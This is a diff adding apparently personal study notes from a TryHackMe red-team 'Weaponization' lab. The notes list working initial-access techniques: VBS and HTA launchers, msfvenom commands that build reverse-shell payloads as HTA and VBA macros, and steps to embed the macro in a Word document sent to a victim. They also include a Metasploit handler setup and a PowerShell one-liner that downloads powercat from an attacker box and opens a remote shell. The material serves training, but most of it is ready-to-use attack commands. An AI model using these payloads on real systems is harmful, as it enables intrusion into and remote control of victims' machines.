@@ -1,0 +1,42 @@
+//THM - Red team ; Weaponization //
+
+***Run Windows Scripting Host:*** 
+	A. create a file example.vbs
+	B. insert this info:
+		Set shell = WScript.CreateObject("Wscript.Shell")
+		shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
+	C. run this by:
+		wscript example.vbs 
+	//If its blocked .vbs file we can change this to .txt and convert run the next command:
+		wscript /e:VBScript example.txt
+	
+
+***An HTML Application (HTA):***
+	this is example -
+		<html>
+		<body>
+		<script>
+			var c= 'cmd.exe'
+			new ActiveXObject('WScript.Shell').Run(c);
+		</script>
+		</body>
+		</html>
+	and we can create a payload by : msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
+
+***Visual Basic for Application (VBA) - by microsoft office applications***
+	A. create the payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
+	B. in the payload put in macro in word and change the Workbook_Open() to Document_Open().
+	C, send the data to the client.
+	D. command in our computer: msfconsole -q ; use exploit/multi/handler ;set payload windows/meterpreter/reverse_tcp ; set LHOST ;  set LPORT ; exploit;
+
+***Using PowerShell:
+	A. bypass the restricted;
+	B.  git clone https://github.com/besimorhino/powercat.git ; cd powercat ; python3 -m http.server 8080;
+	C.  nc -lvp 1337
+	D. file:  powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+
+
+//After the initial access - using C2.
+C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. 
+
+//Sometime need to migrate the system.
